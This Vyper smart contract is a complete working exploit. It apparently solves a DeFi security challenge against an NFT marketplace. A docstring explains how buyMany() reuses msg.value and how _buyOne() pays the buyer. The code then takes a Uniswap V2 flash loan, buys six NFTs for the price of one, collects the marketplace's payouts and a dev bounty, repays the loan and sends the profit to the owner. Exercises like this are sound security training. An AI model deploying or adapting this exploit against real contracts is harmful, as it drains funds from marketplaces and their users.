# @version ^0.3.7

"""
The Marketplace contract has a vulnerability in the `_buyOne()`
function and the `buyMany()` function. The `buyMany()` function 
does not take into account the total value of the NFTs that the 
caller is buying. It assumes the caller is sending a msg.value 
with enough ETH to honestly pay for all NFTs they are buying. So 
you can buy multiple NFTs for the price of one since it reuses the 
msg.value to pay for every NFT. The `_buyOne()` function pays the owner 
of the NFT for the sale, but only after it transfers the NFT to the 
new owner. Therfore the contract actually pays the buyer for the sale. 
An attacker can take a flash loan for 15 weth/eth (NFT price), withdraw 
to ETH, and use that ETH to buy all 6 NFTs (the attacker can do this 
with just 15 ETH because the `buyMany()` function does not account 
for the total value of the amount of NFTs that the caller is buying 
and it reuses the msg.value). The attacker was now paid 75 ETH from 
the marketplace contract, and they can send the NFTs to the dev contract 
for an extra 45 ETH. They definitely will have enough to pay back the flash loan.
"""

from vyper.interfaces import ERC20 as IERC20

interface IUniswapV2Factory:
    def getPair(
        token_a: address,
        token_b: address,
    ) -> address: view

interface IUniswapV2Pair:
    def swap(
        amount0Out: uint256,
        amount1Out: uint256,
        to: address,
        data: Bytes[64],
    ): nonpayable

interface IWETH:
    def withdraw(amount: uint256): nonpayable

interface IERC721:
    def safeTransferFrom(
        sender: address,
        to: address,
        tokenId: uint256,
        data: Bytes[32],
    ): nonpayable

owner: immutable(address)

factory: address
marketplace: address
weth: address
token: address
nft: address
dev: address

@external
@payable
def __init__(
    _factory: address,
    _marketplace: address,
    _weth: address,
    _token: address,
    _nft: address,
    _dev: address,
):
    owner = msg.sender
    self.factory = _factory
    self.marketplace = _marketplace
    self.weth = _weth
    self.token = _token
    self.nft = _nft
    self.dev = _dev

@external
def attack(borrow_amount: uint256):
    assert msg.sender == owner, "!owner"
    pair: address = IUniswapV2Factory(self.factory).getPair(self.weth, self.token)
    assert pair != empty(address), "!pair"
    data: Bytes[64] = _abi_encode(borrow_amount, pair)
    IUniswapV2Pair(pair).swap(
       borrow_amount,
       0,
       self,
       data,
    )
    send(owner, self.balance)

@external
def uniswapV2Call(
    _sender: address,
    _amount0: uint256,
    _amount1: uint256,
    _data: Bytes[64]
):
    assert _sender == self, "!sender"
    pair: address = empty(address)
    borrow_amount: uint256 = empty(uint256)
    borrow_amount, pair = _abi_decode(_data, (uint256, address))
    assert msg.sender == pair, "!pair"

    IWETH(self.weth).withdraw(borrow_amount)
    
    token_ids: DynArray[uint256, 6] = [0, 1, 2, 3, 4, 5]

    raw_call(
        self.marketplace,
        _abi_encode(
            token_ids,
            method_id=method_id("buyMany(uint256[])")
        ),
        value=borrow_amount,
    )
    calldata: Bytes[32] = _abi_encode(self)

    for token_id in token_ids:
        IERC721(self.nft).safeTransferFrom(self, self.dev, token_id, calldata)

    fee: uint256 = ((borrow_amount * 3) / 997) + 1
    repay: uint256 = borrow_amount + fee

    raw_call(self.weth, b"", value=repay)

    IERC20(self.weth).transfer(pair, repay)

@external
def onERC721Received(
    operator: address,
    sender: address,
    token_id: uint256,
    data: Bytes[1024]
) -> bytes4:
    assert msg.sender == self.nft, "!nft"
    return convert(
        method_id("onERC721Received(address,address,uint256,bytes)"),
        bytes4,
    )

@external
@payable
def __default__():
    pass
